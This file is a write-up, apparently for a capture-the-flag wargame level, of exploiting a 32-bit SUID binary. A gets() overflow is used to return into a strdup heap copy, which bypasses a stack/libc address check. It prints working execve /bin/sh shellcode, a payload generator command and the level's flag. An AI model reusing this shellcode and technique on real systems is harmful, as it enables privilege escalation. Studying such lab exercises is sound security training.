@@ -1,0 +1,128 @@
+# Level 2
+
+Binary: 32-bit ELF, SUID level3, dynamically linked.
+
+## Analysis
+
+### Ghidra output
+
+```c
+void main(void) {
+    p();
+    return;
+}
+
+void p(void) {
+    uint unaff_retaddr;
+    char local_50[76];
+
+    fflush(stdout);
+    gets(local_50);
+    if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
+        printf("(%p)\n", unaff_retaddr);
+        _exit(1);
+    }
+    puts(local_50);
+    strdup(local_50);
+    return;
+}
+```
+
+Two things stand out:
+
+1. `gets(local_50)`: buffer overflow, same pattern as level1.
+2. A check on the return address: if its top 4 bits are `0xb`, the program exits.
+
+### Why 0xb?
+
+On 32-bit Linux with ASLR off:
+- Stack is at `0xbfff xxxx`
+- libc is at `0xb7xx xxxx`
+- Heap is at `0x0804 xxxx` (or similar)
+- Binary code is at `0x0804 xxxx`
+
+So the check blocks ret2libc and jumping to shellcode on the stack. Only heap or binary addresses pass.
+
+### The way out: strdup
+
+`strdup(local_50)` copies the buffer to the heap. If I put shellcode in the buffer, strdup copies it somewhere that passes the 0xb check. I can then overwrite the return address with that heap location.
+
+## Exploit
+
+### Offset
+
+Buffer at `ebp - 0x4c` (76 bytes below ebp), saved EBP at ebp, return address at ebp + 4. Total: 80 bytes.
+
+Verifying:
+
+```
+(gdb) run < <(python -c "print('A' * 80 + 'BBBB')")
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+
+EIP = 0x42424242, so offset 80 is correct.
+
+### Finding the heap address
+
+Breakpoint right after the `strdup` call:
+
+```
+(gdb) b *0x0804853d
+```
+
+strdup returns a pointer in `eax`, so after the breakpoint:
+
+```
+(gdb) r < /tmp/payload
+(gdb) info registers eax
+eax            0x804a008
+```
+
+The heap copy sits at `0x0804a008`.
+
+### Shellcode
+
+First attempt: the classic 23-byte execve shellcode. It failed. Execution jumped to the heap, ran a few bytes, then segfaulted at offset 64 into the shellcode.
+
+The reason: the 23-byte shellcode doesn't zero `edx`. `edx` becomes the `envp` argument to execve, and if it contains garbage, the kernel returns EFAULT. execve fails, execution continues past the shellcode into 'A' bytes (each 'A' = `inc ecx`, harmless), then hits offset 64 where the code earlier wrote `0x0804a008` (via `mov %eax,-0xc(%ebp)`), and crashes.
+
+Switched to the Aleph One shellcode (45 bytes) from https://fr.wikipedia.org/wiki/Shellcode. It explicitly sets `edx` with `lea edx, [esi+12]`, pointing to a valid NULL. execve works.
+
+```
+\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
+```
+
+### Payload
+
+```
+45 bytes shellcode + 35 bytes 'A' + 4 bytes heap address + \n
+= 85 bytes total
+```
+
+The trailing `\n` is critical. Without it, `gets()` keeps reading past the payload (from terminal input via `; cat`), the buffer becomes longer, and `strdup` allocates a different-sized chunk at a different address.
+
+```bash
+python -c "import sys; sys.stdout.write('\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'A'*35 + '\x08\xa0\x04\x08\n')" > /tmp/payload
+```
+
+### Running it
+
+```bash
+$ (cat /tmp/payload; cat) | ./level2
+<puts output of the buffer>
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
+No shell prompt appears (the spawned shell isn't interactive), so I typed `cat /home/user/level3/.pass` blindly.
+
+Flag: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
+
+## Notes
+
+Two problems I hit while building this:
+
+1. **Heap address changes with payload size**. strdup uses malloc, which allocates different bin sizes for different string lengths. When I added a byte here or there, the heap address shifted. Fix: always re-check with the exact payload size.
+
+2. **gets() reading past the payload**. Without a trailing newline, gets waits for EOF. The `; cat` construct feeds terminal input into level2's stdin, so whatever I type gets appended to the buffer. Adding `\n` makes gets stop at a known length.
